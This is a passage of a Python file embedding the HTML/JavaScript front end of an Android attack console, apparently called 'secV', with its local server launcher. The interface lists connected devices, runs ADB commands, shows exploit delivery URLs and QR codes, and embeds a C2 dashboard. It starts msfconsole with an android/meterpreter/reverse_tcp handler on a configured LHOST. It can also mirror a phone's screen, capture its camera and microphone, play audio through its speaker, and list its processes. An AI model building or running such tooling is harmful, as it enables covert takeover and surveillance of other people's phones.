    if (qrCount) { b.textContent = qrCount; b.style.display = 'inline'; }
    renderQR();
  });
}

function renderQR() {
  const panel = document.getElementById('qr-panel');
  panel.innerHTML = '';
  if (!qrList.length) {
    panel.innerHTML = '<div style="padding:16px;color:var(--muted);font-size:0.68rem;">No QR codes yet. Run qr_exploit, wan_expose, or rebuild to generate them.</div>';
    return;
  }
  for (const q of qrList) {
    const card = document.createElement('div'); card.className = 'qr-card';
    if (q.startsWith('URL:')) {
      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px;">Delivery URL</div>
        <div class="qr-url">${q.replace('URL: ','')}</div>`;
    } else {
      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px;">QR Code</div>
        <pre>${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre>`;
    }
    panel.appendChild(card);
  }
}

// ── Files ─────────────────────────────────────────────────────────────────────
function loadFiles() {
  const panel = document.getElementById('files-panel');
  panel.innerHTML = '<div style="padding:8px;color:var(--muted);font-size:0.68rem;">Loading...</div>';
  fetch('/api/workdir').then(r => r.json()).then(d => {
    panel.innerHTML = `<div style="padding:5px 10px;color:var(--muted);font-size:0.58rem;letter-spacing:0.08em;text-transform:uppercase;border-bottom:1px solid var(--border)">
      Base: ${d.base} · ${(d.files||[]).length} files (newest first)</div>`;
    for (const f of (d.files||[])) {
      const row = document.createElement('div'); row.className = 'file-row';
      const sz = f.size > 1048576 ? (f.size/1048576).toFixed(1)+'MB' :
                 f.size > 1024    ? (f.size/1024).toFixed(1)+'KB' : f.size+'B';
      const ts = new Date(f.mtime*1000).toLocaleString();
      row.innerHTML = `<span class="fn" title="${f.full}">${f.path}</span>
        <span class="fsz">${sz}</span>
        <span class="fts">${ts}</span>
        <button class="copy-btn" onclick="navigator.clipboard.writeText('${f.full.replace(/'/g,"\\'")}')">copy</button>`;
      panel.appendChild(row);
    }
    if (!(d.files||[]).length)
      panel.innerHTML += '<div style="padding:12px;color:var(--muted);font-size:0.68rem;">No work files yet. Run an operation first.</div>';
  });
}

// ── Setup/Deps ────────────────────────────────────────────────────────────────
function loadSettings() {
  fetch('/api/settings').then(r => r.json()).then(d => {
    settings = d.settings || settings;
    document.getElementById('s-lhost').value   = settings.lhost||'';
    document.getElementById('s-lport').value   = settings.lport||'4444';
    document.getElementById('s-bore').value    = settings.bore_server||'bore.pub';
    document.getElementById('s-nvd').value     = settings.nvd_api_key||'';
    document.getElementById('s-c2host').value  = settings.c2_host||'';
    document.getElementById('s-c2port').value  = settings.c2_port||'8889';
  });
}

function saveSettings() {
  settings.lhost      = document.getElementById('s-lhost').value.trim();
  settings.lport      = document.getElementById('s-lport').value.trim();
  settings.bore_server = document.getElementById('s-bore').value.trim();
  settings.nvd_api_key = document.getElementById('s-nvd').value.trim();
  settings.c2_host    = document.getElementById('s-c2host').value.trim();
  settings.c2_port    = document.getElementById('s-c2port').value.trim();
  fetch('/api/settings', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(settings)
  }).then(() => {
    updateLhostDisplay();
    termLine(`\x1b[32m[+] Settings saved — LHOST=${settings.lhost||'auto'}, LPORT=${settings.lport}\x1b[0m`);
  });
}

function detectLhost() {
  fetch('/api/lhost').then(r => r.json()).then(d => {
    if (d.lhost && !settings.lhost) {
      settings.lhost = d.lhost;
      document.getElementById('s-lhost').value = d.lhost;
    }
    updateLhostDisplay();
  });
}

function updateLhostDisplay() {
  const el = document.getElementById('lhost-display');
  el.textContent = settings.lhost ? `lhost: ${settings.lhost}` : '';
}

function loadDeps() {
  const grid = document.getElementById('dep-grid');
  grid.innerHTML = '<div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Checking...</div>';
  fetch('/api/deps').then(r => r.json()).then(d => {
    grid.innerHTML = '';
    for (const [name, info] of Object.entries(d.deps||{})) {
      const card = document.createElement('div'); card.className = 'dep-card';
      card.innerHTML = `<div class="dep-dot ${info.ok?'ok':'miss'}"></div>
        <div style="flex:1">
          <div class="dep-name">${name} ${info.ok?'<span style="color:var(--green);font-size:0.6rem;">✓</span>':'<span style="color:var(--red);font-size:0.6rem;">✗</span>'}</div>
          ${!info.ok?`<div class="dep-install">${info.install}</div>`:''}
        </div>`;
      grid.appendChild(card);
    }
  });
}

// ── Tabs ──────────────────────────────────────────────────────────────────────
function switchTab(tab) {
  const names = ['terminal','adb','findings','qr','files','setup','c2','live'];
  document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', names[i]===tab));
  document.getElementById('terminal-wrap').style.display  = tab==='terminal' ? 'flex':'none';
  document.getElementById('adb-console').style.display    = tab==='adb'      ? 'flex':'none';
  document.getElementById('findings-panel').style.display = tab==='findings' ? 'flex':'none';
  document.getElementById('qr-panel').style.display       = tab==='qr'       ? 'flex':'none';
  document.getElementById('files-panel').style.display    = tab==='files'    ? 'flex':'none';
  document.getElementById('setup-panel').style.display    = tab==='setup'    ? 'flex':'none';
  document.getElementById('c2-panel').style.display       = tab==='c2'       ? 'flex':'none';
  document.getElementById('live-panel').style.display     = tab==='live'     ? 'flex':'none';
  if (tab === 'qr')     { loadQR(); }
  if (tab === 'files')  { loadFiles(); }
  if (tab === 'setup')  { loadDeps(); }
  if (tab === 'c2')     { checkC2Status(); }
  if (tab === 'live')   { onLiveTabOpen(); }
}

// ── ADB Console ───────────────────────────────────────────────────────────────
function adbEnter(e) {
  if (e.key !== 'Enter') return;
  const inp = document.getElementById('adb-input');
  const cmd = inp.value.trim(); if (!cmd) return;
  inp.value = '';
  const serial = document.getElementById('dev-select').value;
  const args = serial ? ['-s', serial, ...cmd.split(' ')] : cmd.split(' ');
  adbPrint(`\x1b[36madb ${args.join(' ')}\x1b[0m`);
  fetch('/api/adb', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({args})
  }).then(r => r.json()).then(d => adbPrint(d.output||''));
}
function adbPrint(line) {
  const out = document.getElementById('adb-output');
  const s = document.createElement('div');
  s.innerHTML = ansiToHtml(line); out.appendChild(s); out.scrollTop = out.scrollHeight;
}

// ── Devices ───────────────────────────────────────────────────────────────────
let _knownSerials  = new Set();   // track connected serials across polls
let _deviceMap     = {};          // serial → device info object
let _deviceWatchId = null;

function startDeviceWatch() {
  pollDevices();                               // immediate first poll
  _deviceWatchId = setInterval(pollDevices, 2000);
}

function pollDevices() {
  fetch('/api/devices').then(r => r.json()).then(d => {
    _applyDeviceList(d.devices || []);
  }).catch(() => {});
}

// ── shared device-list applier (used by poll + force reload) ──────────────────
function _applyDeviceList(devs) {
  const newMap = {};
  devs.forEach(dev => { newMap[dev.serial] = dev; });
  const newSet = new Set(Object.keys(newMap));
  const sel    = document.getElementById('dev-select');
  const curSel = sel.value;

  // ── detect connects ────────────────────────────────────────────
  for (const serial of newSet) {
    if (!_knownSerials.has(serial)) {
      const dev   = newMap[serial];
      const label = dev.label || serial;
      if (dev.status === 'unauthorized') {
        termLine(`\x1b[33m[!] Device detected but unauthorized: ${serial} — accept USB debugging on device\x1b[0m`);
        showToast(`Tap "Allow" on ${serial} to authorize USB`, 'info', 6000);
      } else {
        const aVer  = dev.android ? ` Android ${dev.android}` : '';
        termLine(`\x1b[32m[+] Device connected: ${label}${aVer} (${serial})\x1b[0m`);
        showToast(`Connected: ${label}${aVer}`, 'connect', 4000);
        if (!curSel) {
          sel.value = serial;
          _updateDevBadge(dev);
          appList = [];
          if (currentOp) renderParams(currentOp);
        }
      }
    }
  }

  // ── detect disconnects ─────────────────────────────────────────
  for (const serial of _knownSerials) {
    if (!newSet.has(serial)) {
      const label = (_deviceMap[serial] && _deviceMap[serial].label) || serial;
      termLine(`\x1b[31m[!] Device disconnected: ${label} (${serial})\x1b[0m`);
      showToast(`Disconnected: ${label}`, 'disconnect', 4000);
      if (curSel === serial) {
        document.getElementById('dev-name').textContent = 'no device';
        document.getElementById('dev-os').textContent   = '';
        document.getElementById('devbadge').classList.remove('connected');
        const remaining = devs.filter(x => x.serial !== serial);
        if (remaining.length) {
          sel.value = remaining[0].serial;
          _updateDevBadge(remaining[0]);
        } else {
          sel.value = '';
        }
      }
    }
  }

  // ── rebuild dropdown (virtualised — handles unlimited devices) ─
  _knownSerials = newSet;
  _deviceMap    = newMap;
  const prevSel = sel.value;

  // Use a DocumentFragment for O(n) DOM insertion regardless of device count
  const frag = document.createDocumentFragment();
  const placeholder = document.createElement('option');
  placeholder.value = ''; placeholder.textContent = '-- device --';
  frag.appendChild(placeholder);

  for (const dev of devs) {
    const o = document.createElement('option');
    o.value = dev.serial;
    if (dev.status === 'unauthorized') {
      o.textContent = `⚠ ${dev.serial} — tap Allow on device`;
      o.disabled    = true;
      o.style.color = '#e67828';
    } else {
      o.textContent = (dev.label || dev.serial) +
        (dev.android ? ' · Android '+dev.android : '') +
        (dev.sdk     ? ' (SDK '+dev.sdk+')'       : '');
    }
    if (dev.serial === prevSel) o.selected = true;
    frag.appendChild(o);
  }
  sel.innerHTML = '';
  sel.appendChild(frag);

  // ── update device count badge ──────────────────────────────────
  const cnt = devs.length;
  const cntEl = document.getElementById('dev-count');
  if (cntEl) cntEl.textContent = cnt ? `${cnt} device${cnt>1?'s':''}` : '';

  // ── sync badge ─────────────────────────────────────────────────
  if (prevSel && newMap[prevSel]) {
    _updateDevBadge(newMap[prevSel]);
  } else if (!prevSel || !newMap[prevSel]) {
    document.getElementById('devbadge').classList.remove('connected');
  }
}

function _updateDevBadge(dev) {
  const name = dev.label || dev.serial;
  const os   = dev.android
    ? 'Android ' + dev.android + (dev.sdk ? ' (SDK '+dev.sdk+')' : '')
    : (dev.tags || '');
  document.getElementById('dev-name').textContent = name;
  document.getElementById('dev-os').textContent   = os;
  document.getElementById('devbadge').classList.add('connected');
}

function refreshDevices() {
  // manual refresh: clear known state and re-poll immediately
  _knownSerials = new Set();
  _deviceMap    = {};
  pollDevices();
}

function forceReloadADB() {
  const btn = document.getElementById('reload-btn');
  btn.textContent = '… restarting';
  btn.disabled    = true;
  fetch('/api/devices/reload').then(r => r.json()).then(d => {
    btn.textContent = '⚡ reload adb';
    btn.disabled    = false;
    _knownSerials   = new Set();
    _deviceMap      = {};
    // process the fresh device list returned by reload
    _applyDeviceList(d.devices || []);
    termLine('\x1b[36m[i] ADB server restarted — device list refreshed\x1b[0m');
  }).catch(() => {
    btn.textContent = '⚡ reload adb';
    btn.disabled    = false;
    termLine('\x1b[31m[!] ADB reload failed\x1b[0m');
  });
}

function onDeviceChange() {
  const serial = document.getElementById('dev-select').value;
  if (serial && _deviceMap[serial]) {
    _updateDevBadge(_deviceMap[serial]);
  } else if (serial) {
    // fallback: fetch devinfo if not in cache
    fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
      const dev = {
        serial,
        label:   (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial),
        android: d['ro.build.version.release']||'',
        sdk:     d['ro.build.version.sdk']||'',
      };
      _updateDevBadge(dev);
    });
  } else {
    document.getElementById('dev-name').textContent = 'no device';
    document.getElementById('dev-os').textContent   = '';
    document.getElementById('devbadge').classList.remove('connected');
  }
  appList = [];
  if (currentOp) renderParams(currentOp);
}

function loadDevInfo(serial) {
  if (_deviceMap[serial]) { _updateDevBadge(_deviceMap[serial]); return; }
  fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
    document.getElementById('dev-name').textContent =
      (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial);
    document.getElementById('dev-os').textContent =
      'Android '+(d['ro.build.version.release']||'?')+
      ' (SDK '+(d['ro.build.version.sdk']||'?')+')';
    document.getElementById('devbadge').classList.add('connected');
  });
}

function loadAppList() {
  const serial = document.getElementById('dev-select').value;
  const url = '/api/applist' + (serial ? '?serial='+encodeURIComponent(serial) : '');
  fetch(url).then(r => r.json()).then(d => {
    appList = d.packages||[];
    termLine(`\x1b[32m[+] Loaded ${appList.length} apps\x1b[0m`);
    if (currentOp) renderParams(currentOp);
  });
}

// ── C2 Dashboard ──────────────────────────────────────────────────────────────
function getC2Port() { return parseInt(document.getElementById('c2-port-inp').value)||8891; }

function checkC2Status() {
  const port = getC2Port();
  fetch('/api/c2/status?port='+port).then(r => r.json()).then(d => {
    const badge = document.getElementById('c2-status-badge');
    const link  = document.getElementById('c2-open-link');
    if (d.running) {
      badge.textContent = '● :'+d.port; badge.style.color = 'var(--green)';
      showC2Frame(d.url); link.href = d.url; link.style.display = 'inline';
    } else {
      badge.textContent = '○ stopped'; badge.style.color = 'var(--muted)';
      link.style.display = 'none';
    }
  });
}

function showC2Frame(url) {
  const iframe = document.getElementById('c2-iframe');
  const ph     = document.getElementById('c2-placeholder');
  if (iframe.src !== url) iframe.src = url;
  ph.style.display = 'none'; iframe.style.display = 'block';
}

function launchC2() {
  const port = getC2Port();
  const badge = document.getElementById('c2-status-badge');
  badge.textContent = '… starting'; badge.style.color = 'var(--grey)';
  fetch('/api/c2/launch?port='+port).then(r => r.json()).then(d => {
    if (d.ok) {
      showC2Frame(d.url);
      document.getElementById('c2-open-link').href = d.url;
      document.getElementById('c2-open-link').style.display = 'inline';
      badge.textContent = '● :'+d.port; badge.style.color = 'var(--green)';
    } else {
      badge.textContent = '✗ failed'; badge.style.color = 'var(--red)';
    }
  });
}

function stopC2() {
  fetch('/api/c2/stop').then(() => {
    const iframe = document.getElementById('c2-iframe');
    iframe.src = ''; iframe.style.display = 'none';
    document.getElementById('c2-placeholder').style.display = 'flex';
    document.getElementById('c2-status-badge').textContent = '○ stopped';
    document.getElementById('c2-status-badge').style.color = 'var(--muted)';
    document.getElementById('c2-open-link').style.display = 'none';
  });
}

// ── Toast ─────────────────────────────────────────────────────────────────────
function showToast(msg, type='info', ms=3200) {
  const c = document.getElementById('toast-container');
  if (!c) return;
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = msg;
  c.appendChild(t);
  setTimeout(() => {
    t.style.animation = 'toastOut .25s ease both';
    setTimeout(() => t.remove(), 260);
  }, ms);
}

// ── Status ────────────────────────────────────────────────────────────────────
function updateStatus() {
  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
  const dot  = document.getElementById('status-dot');
  const txt  = document.getElementById('status-text');
  const kill = document.getElementById('kill-btn');
  const pb   = document.getElementById('progress-bar');
  if (running.length > 0) {
    dot.className = 'active';
    if (running.length === 1) {
      const s = running[0];
      txt.textContent = 'running: ' + s.op + (s.device ? ' ['+s.device+']' : '');
    } else {
      txt.textContent = running.length + ' running: ' + running.map(s=>s.op).join(', ');
    }
    kill.classList.add('active');
    if (pb) pb.classList.add('active');
  } else {
    dot.className = '';
    txt.textContent = 'idle';
    kill.classList.remove('active');
    if (pb) pb.classList.remove('active');
    opStartTs = null;
  }
}

function updateStatusTime() {
  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
  const el = document.getElementById('status-time');
  if (running.length === 0) { el.textContent = ''; return; }
  const oldest = Math.min(...running.map(s => s.startTs));
  el.textContent = Math.floor((Date.now() - oldest) / 1000) + 's';
}

function killOp(sid) {
  const url = sid ? '/api/kill?session=' + sid : '/api/kill';
  fetch(url, {method:'POST'});
}

function updateSessionsBar() {
  const bar   = document.getElementById('sessions-bar');
  const label = document.getElementById('sess-label');
  const cnt   = document.getElementById('sess-count');
  const all   = Object.values(_activeSessions);
  if (all.length === 0) { bar.classList.remove('visible'); return; }
  bar.classList.add('visible');
  const running = all.filter(s => s.status === 'running');
  if (cnt) cnt.textContent = running.length ? running.length + ' running' : 'all done';

  // rebuild pills — preserve existing ones by sid to avoid flicker
  const existing = new Set([...bar.querySelectorAll('.sess-pill')].map(el => +el.dataset.sid));
  const current  = new Set(all.map(s => s.id));

  // remove stale pills
  bar.querySelectorAll('.sess-pill').forEach(el => {
    if (!current.has(+el.dataset.sid)) el.remove();
  });

  // add/update
  const frag = document.createDocumentFragment();
  all.forEach(s => {
    let pill = bar.querySelector('.sess-pill[data-sid="'+s.id+'"]');
    const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
    if (!pill) {
      pill = document.createElement('div');
      pill.className = 'sess-pill ' + s.status;
      pill.dataset.sid = s.id;
      pill.innerHTML =
        '<span class="sp-dot" style="background:'+s.color+'"></span>' +
        '<span class="sp-label">#'+s.id+' '+s.op+'</span>' +
        (s.device ? '<span class="sp-dev">'+s.device+'</span>' : '') +
        '<span class="sp-time">'+elapsed+'s</span>' +
        '<span class="sp-kill" title="kill" onclick="killOp('+s.id+')">×</span>';
      if (s.status === 'running') pill.querySelector('.sp-dot').classList.add('running');
      frag.appendChild(pill);
    } else {
      pill.className = 'sess-pill ' + s.status;
      const dot = pill.querySelector('.sp-dot');
      if (dot) {
        dot.style.background = s.color;
        dot.classList.toggle('running', s.status === 'running');
      }
      const timeEl = pill.querySelector('.sp-time');
      if (timeEl) timeEl.textContent = elapsed + 's';
    }
  });
  bar.appendChild(frag);
}

// ── Live Media ────────────────────────────────────────────────────────────────
let _screenActive  = false;
let _screenFpsTs   = 0;
let _screenFpsCnt  = 0;
let _micActive     = false;
let _micPollTimer  = null;
let _msfEs         = null;
let _speakerFile   = null;

function onLiveTabOpen() {
  const serial = document.getElementById('dev-select').value;
  // populate cam select from device map
  if (_deviceMap[serial]) {
    const cam = document.getElementById('cam-id');
    // basic: ensure two options always present
    if (cam.options.length < 2) {
      cam.add(new Option('Camera 1 (front)', '1'));
    }
  }
  checkMsfStatus();
}

// ── Screen ────────────────────────────────────────────────────────────────────
function _screenSerial() {
  return document.getElementById('dev-select').value || '';
}

function startScreen() {
  if (_screenActive) return;
  _screenActive = true;
  _screenFpsCnt = 0;
  const serial  = _screenSerial();
  const img     = document.getElementById('screen-img');
  const ph      = document.getElementById('screen-placeholder');
  const dot     = document.getElementById('screen-dot');
  const stopBtn = document.getElementById('screen-stop-btn');
  const overlay = document.getElementById('screen-overlay');

  img.src = '/api/media/screen' + (serial ? '?serial=' + encodeURIComponent(serial) : '');
  img.style.display = 'block'; ph.style.display = 'none';
  overlay.style.display = 'block';
  dot.classList.add('on');
  stopBtn.style.display = '';
  document.querySelector('#live-panel .live-section .live-btn.go').style.display = 'none';

  // FPS counter via load events
  img.onload = () => {
    _screenFpsCnt++;
    const now = Date.now();
    if (now - _screenFpsTs >= 1000) {
      const fps = (_screenFpsCnt / ((now - _screenFpsTs) / 1000)).toFixed(1);
      document.getElementById('screen-fps').textContent = fps + ' fps';
      _screenFpsCnt = 0; _screenFpsTs = now;
    }
  };
  img.onerror = () => {
    stopScreen();
    showToast('Screen stream error — is device authorized?', 'disconnect', 4000);
  };
  document.getElementById('live-badge').style.display = 'inline';
  showToast('Screen mirror started', 'connect', 2000);
}

function stopScreen() {
  _screenActive = false;
  const img     = document.getElementById('screen-img');
  img.src       = ''; img.style.display = 'none';
  document.getElementById('screen-placeholder').style.display = '';
  document.getElementById('screen-overlay').style.display     = 'none';
  document.getElementById('screen-dot').classList.remove('on');
  document.getElementById('screen-stop-btn').style.display    = 'none';
  document.querySelector('#live-panel .live-section .live-btn.go').style.display = '';
  document.getElementById('screen-fps').textContent           = '';
  document.getElementById('live-badge').style.display         = 'none';
}

function snapScreen() {
  const serial = _screenSerial();
  const url = '/api/media/screen/snap' + (serial ? '?serial='+encodeURIComponent(serial) : '');
  const a = document.createElement('a');
  a.href = url; a.download = 'screen_' + Date.now() + '.png';
  a.click();
}

// ── Camera ────────────────────────────────────────────────────────────────────
function camSnap() {
  const serial = _screenSerial();
  const camId  = document.getElementById('cam-id').value;
  const url    = '/api/media/camera/snap?serial=' + encodeURIComponent(serial) + '&id=' + camId;
  const img    = document.getElementById('camera-img');
  const ph     = document.getElementById('camera-placeholder');
  img.onload   = () => { img.style.display = 'block'; ph.style.display = 'none'; };
  img.onerror  = () => showToast('Camera snap failed — try via Meterpreter webcam_snap', 'disconnect', 4000);
  img.src      = url + '&_t=' + Date.now();
}

function startCamStream() {
  const port = document.getElementById('cam-port').value || '8880';
  const img  = document.getElementById('camera-img');
  const ph   = document.getElementById('camera-placeholder');
  img.src    = '/api/media/camera/stream?port=' + port + '&_t=' + Date.now();
  img.style.display = 'block'; ph.style.display = 'none';
  document.getElementById('cam-dot').classList.add('on');
  img.onerror = () => {
    img.style.display = 'none'; ph.style.display = '';
    document.getElementById('cam-dot').classList.remove('on');
    showToast('Camera stream failed — run webcam_stream in MSF first', 'disconnect', 5000);
  };
  showToast('Camera stream started (proxied from port ' + port + ')', 'connect', 2500);
}

// ── Microphone ────────────────────────────────────────────────────────────────
function toggleMic() {
  if (_micActive) stopMicRecord();
  else startMicRecord();
}

function startMicRecord() {
  _micActive = true;
  const btn    = document.getElementById('mic-btn');
  const serial = _screenSerial();
  const dur    = document.getElementById('mic-dur').value;
  btn.textContent = '■ Stop'; btn.classList.add('active');
  document.getElementById('audio-dot').classList.add('on');
  document.getElementById('mic-status').textContent = 'Recording…';
  fetch('/api/media/mic/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device: serial, duration: parseInt(dur)})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      _micPollTimer = setInterval(pollMicChunk, (parseInt(dur) + 1) * 1000);
    } else {
      showToast('Mic start failed: ' + (d.error||''), 'disconnect', 4000);
      stopMicRecord();
    }
  });
}

function stopMicRecord() {
  _micActive = false;
  clearInterval(_micPollTimer); _micPollTimer = null;
  document.getElementById('mic-btn').textContent = '▶ Record';
  document.getElementById('mic-btn').classList.remove('active');
  document.getElementById('audio-dot').classList.remove('on');
  document.getElementById('mic-status').textContent = 'Stopped';
  fetch('/api/media/mic/stop', {method:'POST'});
}

function pollMicChunk() {
  fetch('/api/media/mic/chunk').then(r => {
    if (!r.ok) return;
    return r.blob();
  }).then(blob => {
    if (!blob) return;
    const url   = URL.createObjectURL(blob);
    const audio = document.getElementById('mic-audio');
    audio.src   = url; audio.style.display = 'block';
    const ts    = new Date().toLocaleTimeString();
    document.getElementById('mic-status').textContent = 'Last chunk: ' + ts;
    // animate mic bars
    _animateMicBars();
  }).catch(()=>{});
}

function _animateMicBars() {
  const viz = document.getElementById('mic-visualizer');
  viz.innerHTML = '';
  for (let i=0;i<24;i++) {
    const b = document.createElement('div');
    b.className = 'mic-bar';
    b.style.height = Math.floor(Math.random()*22+4)+'px';
    viz.appendChild(b);
  }
  setTimeout(() => { viz.innerHTML = ''; }, 800);
}

// ── Speaker ───────────────────────────────────────────────────────────────────
let _speakerB64 = '';

function speakerFileChosen(input) {
  const file = input.files[0];
  if (!file) return;
  _speakerFile = file;
  document.getElementById('spk-label').textContent = file.name;
  document.getElementById('spk-status').textContent = 'Ready: ' + file.name;
  const reader = new FileReader();
  reader.onload = e => {
    _speakerB64 = e.target.result.split(',')[1];
  };
  reader.readAsDataURL(file);
}

function pushSpeaker() {
  if (!_speakerB64) { showToast('Select an audio file first', 'info', 2500); return; }
  const ext    = (_speakerFile.name.split('.').pop() || 'mp3').toLowerCase();
  const serial = _screenSerial();
  document.getElementById('spk-status').textContent = 'Pushing to device…';
  fetch('/api/media/speaker', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device: serial, data: _speakerB64, ext})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      document.getElementById('spk-status').textContent = 'Playing: ' + d.path;
      showToast('Audio pushed and playing on device', 'connect', 3000);
    } else {
      document.getElementById('spk-status').textContent = 'Error: ' + (d.error||'failed');
      showToast('Speaker push failed: ' + (d.error||''), 'disconnect', 4000);
    }
  });
}

// ── MSF Meterpreter Console ───────────────────────────────────────────────────
function startMsf() {
  const serial = _screenSerial();
  const lhost  = (settings.lhost || '');
  const lport  = (settings.lport || '4444');
  const init   = lhost
    ? `use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; run -j`
    : '';
  fetch('/api/msf/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({init})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      connectMsfSSE();
      setMsfStatus(true);
      showToast('msfconsole started', 'connect', 2500);
    } else {
      showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
    }
  });
}

function stopMsf() {
  fetch('/api/msf/stop', {method:'POST'}).then(()=>{
    setMsfStatus(false);
    if (_msfEs) { _msfEs.close(); _msfEs = null; }
    showToast('msfconsole stopped', 'info', 2000);
  });
}

function checkMsfStatus() {
  fetch('/api/msf/sessions').then(r=>r.json()).then(d=>{
    setMsfStatus(d.running);
    if (d.running && !_msfEs) connectMsfSSE();
  }).catch(()=>{});
}

function setMsfStatus(on) {
  const el = document.getElementById('msf-status');
  const dot = document.getElementById('msf-dot');
  el.textContent = on ? 'running' : 'offline';
  el.className   = on ? 'on' : '';
  if (on) dot.classList.add('on'); else dot.classList.remove('on');
}

function connectMsfSSE() {
  if (_msfEs) _msfEs.close();
  _msfEs = new EventSource('/api/msf/stream');
  _msfEs.onmessage = (e) => msfLine(e.data);
  _msfEs.onerror   = () => setTimeout(() => {
    if (_msfEs) { _msfEs.close(); _msfEs = null; }
  }, 3000);
}

function msfLine(raw) {
  const term = document.getElementById('msf-terminal');
  const span = document.createElement('span');
  span.className = 'ln';
  span.innerHTML = ansiToHtml(raw) + '\n';
  term.appendChild(span);
  term.scrollTop = term.scrollHeight;
  // auto-detect webcam stream port announcement
  const portMatch = raw.match(/webcam.*?(\d{4,5})/i);
  if (portMatch) {
    document.getElementById('cam-port').value = portMatch[1];
    showToast('Webcam stream on port ' + portMatch[1] + ' — click Camera ▶ Stream', 'info', 5000);
  }
}

function msfSend(cmd) {
  fetch('/api/msf/send', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cmd})
  }).then(r => r.json()).then(d => {
    if (!d.ok) showToast('MSF send failed: ' + (d.error||''), 'disconnect', 3000);
  });
  // echo to terminal
  msfLine('\x1b[36mmsf> ' + cmd + '\x1b[0m');
}

function msfEnter(e) {
  if (e.key !== 'Enter') return;
  const inp = document.getElementById('msf-input');
  const cmd = inp.value.trim();
  if (!cmd) return;
  inp.value = '';
  msfSend(cmd);
}

// ── Process Sniffer ───────────────────────────────────────────────────────────
let _procEs         = null;
let _procFilter     = '';
let _procList       = [];
let _procSelected   = null;

function showProcSniff(visible) {
  const panel = document.getElementById('proc-sniff-panel');
  if (visible) panel.classList.add('visible');
  else {
    panel.classList.remove('visible');
    stopProcStream();
  }
}

function onPsFilter() {
  _procFilter = document.getElementById('ps-filter').value.toLowerCase();
  renderProcTable(_procList);
}

function renderProcTable(procs) {
  const filt   = _procFilter;
  const tbody  = document.getElementById('proc-tbody');
  const cnt    = document.getElementById('ps-count');
  const rows   = filt
    ? procs.filter(p => p.name.toLowerCase().includes(filt) || p.pid.includes(filt))
    : procs;
  cnt.textContent = rows.length + ' / ' + procs.length + ' procs';
  const frag = document.createDocumentFragment();
  rows.forEach(p => {
    const tr = document.createElement('tr');
    if (_procSelected && _procSelected === p.pid) tr.classList.add('selected');
    const sc = 'ps-state-' + p.state.charAt(0).toUpperCase();
    tr.innerHTML =
      `<td class="ps-pid">${p.pid}</td>` +
      `<td class="ps-pid">${p.ppid}</td>` +
      `<td class="ps-user">${p.user}</td>` +
      `<td class="${sc}">${p.state}</td>` +
      `<td class="ps-name" title="${p.name}">${p.name}</td>`;
    tr.onclick = () => selectProc(p);
    frag.appendChild(tr);
  });
  tbody.textContent = '';
  tbody.appendChild(frag);
}

function selectProc(p) {
  _procSelected = p.pid;
  // Fill target_process field
  const field = document.querySelector('.param-field[data-name="target_process"]');
  if (field) field.value = p.pid;
  renderProcTable(_procList);
  showToast(`Selected PID ${p.pid} — ${p.name}`, 'connect', 2500);
}

function refreshProcs() {
  const serial = document.getElementById('dev-select').value || '';
  const url    = '/api/proc/list?serial=' + encodeURIComponent(serial) +
                 (settings ? '' : '');
  fetch(url).then(r => r.json()).then(d => {
    _procList = d.procs || [];
    renderProcTable(_procList);
  }).catch(e => showToast('proc list error: ' + e, 'disconnect', 3000));
}

function toggleProcStream() {
  if (_procEs) { stopProcStream(); return; }
  const serial = document.getElementById('dev-select').value || '';
  const url    = '/api/proc/stream?serial=' + encodeURIComponent(serial);
  _procEs      = new EventSource(url);
  _procEs.onmessage = e => {
    try {
      const d = JSON.parse(e.data);
      _procList = d.procs || [];
      renderProcTable(_procList);
    } catch(_) {}
  };
  _procEs.onerror = () => { stopProcStream(); };
  document.getElementById('ps-toggle-btn').textContent = '⏹ stop';
  document.getElementById('ps-toggle-btn').classList.add('active');
}

function stopProcStream() {
  if (_procEs) { _procEs.close(); _procEs = null; }
  document.getElementById('ps-toggle-btn').textContent = '▶ stream';
  document.getElementById('ps-toggle-btn').classList.remove('active');
}

// ── Utils ─────────────────────────────────────────────────────────────────────
function now() {
  return new Date().toLocaleTimeString('en-GB',{hour12:false,
    hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
</script>
</body>
</html>
"""


# ── Server launcher ────────────────────────────────────────────────────────────

class _ThreadingServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True


def launch(port: int = _GUI_PORT, serial: str = "", open_browser: bool = True):
    """Start the GUI HTTP server. Blocks until KeyboardInterrupt."""
    server = _ThreadingServer(("127.0.0.1", port), _Handler)
    url    = f"http://127.0.0.1:{port}"
    print(f"\x1b[32m[+] secV Android GUI running at {url}\x1b[0m", file=sys.stderr)
    print(f"    Press Ctrl+C to stop", file=sys.stderr)
    if open_browser:
        threading.Timer(0.8, lambda: webbrowser.open(url)).start()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\x1b[33m[*] Stopped\x1b[0m", file=sys.stderr)
    finally:
        server.server_close()


